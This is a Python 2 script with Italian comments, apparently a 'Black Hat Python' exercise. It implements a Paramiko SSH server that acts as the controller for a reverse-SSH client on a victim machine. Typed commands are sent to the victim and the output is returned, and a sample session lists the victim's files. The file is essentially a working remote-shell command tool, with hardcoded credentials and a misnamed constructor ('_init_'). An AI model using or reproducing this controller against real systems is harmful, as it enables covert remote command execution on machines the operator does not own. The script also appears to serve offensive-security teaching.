# bhp_ssh_server.py

# Il seguente codice sorgente realizza l'implementazione di un Server
# SSH utilizzando le librerie fornite da Paramiko che puo' essere
# utilizzato per permettere a un Client SSH in Reverse di connettersi
# e instaurare un canale di comunicazione.

# ------------------------------
# Per utilizzare questo software, eseguire il seguente comando per avviare
# il Server SSH sulla nostra macchina:
# $ sudo python bhp_ssh_server.py 127.0.0.1 22
# [sudo] password for rambodrahmani:
# [-] Listening for connection.
# [+] Got a connection.
#
# Dopo di che possiamo avviare l'instanza client di bhp_reverse_ssh.py:
# $ python bhp_reverse_ssh.py 127.0.0.1 rambodrahmani password ClientConnected
#
# L'unico output che si ottiene nella shell del Client e'
# Welcome to bhp_reverse_ssh
#
# Mentre possiamo utilizzare la shell del Server per inviare comandi e leggere
# l'output come mostrato dal proseguo dell'esempio:
# [+] Authenticated.
# ClientConnected
# Enter command: ls
# Chap1
# Chap10
# Chap11
# Chap2
# Chap3
# Chap4
# Chap5
# Chap6
# Chap7
# Chap8
# Chap9
# README.md
# ------------------------------


import sys
import socket
import paramiko
import threading

# Utilizzeremo la chiave di autenticazione fornita da paramiko
# per avviare velocemente il nostro Server SSH.
host_key = paramiko.RSAKey(filename='paramiko/demos/test_rsa.key')

class Server (paramiko.ServerInterface):
	def _init_(self):
		self.event = threading.Event()

	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

	def check_auth_password(self, username, password):
		if (username == "rambodrahmani") and (password == "password"):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED

def usage():
        print("Usage python bhp_ssh_server.py [ip] [port]")
        print("Example python bhp_ssh_server.py 192.168.1.1 22")

def main():
        if not len(sys.argv) == 3:
                usage()
                sys.exit(0)

	server = sys.argv[1]
	ssh_port = int(sys.argv[2])

	# Proprio come abbiamo fatto con gli esempi precedenti, la prima parte
	# da avviare e' il socket che rimane in ascolto per le connessioni
	# in entrata.
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind((server, ssh_port))
		sock.listen(100)

		print("[-] Listening for connection.")

		client,addr = sock.accept()
	except Exception, e:
		print("[-] Listen failed: " + str(e))
		sys.exit(1)

	print("[+] Got a connection.")

	# Quando un Client si connette viene avviata una nuova sessione
	# SSH utilizzando Paramiko, il Client si autentifica e invia il
	# messaggio ClientConnected (vedi bhp_reverse_ssh.py"). Da questo
	# momento in poi, qualsiasi comando digitato sulla shell in cui
	# abbiamo eseguito bhp_ssh_server.py verra' inviato alla istanza di
	# bhp_reverse_ssh.py in esecuzione sulla macchina vittima e il
	# risultato dell'esecuzione del comando verra' inviato in risposta
	# alla shell sulla quale si trova in esecuzione bhp_ssh_server.py.
	try:
		bhSession = paramiko.Transport(client)
		bhSession.add_server_key(host_key)
		server = Server()

		try:
			bhSession.start_server(server=server)
		except paramiko.SSHException, x:
			print("[-] SSH negotiation failed.")

		chan = bhSession.accept(20)

		print("[+] Authenticated.")
		print(chan.recv(1024))

		# Banner
		chan.send("Welcome to bhp_reverse_ssh")

		while True:
			try:
				command = raw_input("Enter command: ").strip("\n")
				if command != 'exit':
					chan.send(command)
					print(chan.recv(1024) + '\n')
				else:
					chan.send('exit')
					print('Exiting')
					bhSession.close()
					raise Exception('exit')
			except KeyboardInterrupt:
				bhSession.close()
	except Exception, e:
		print("[-] Caught exception: " + str(e))
		try:
			bhSession.close()
		except:
			pass
		sys.exit(1)

main()
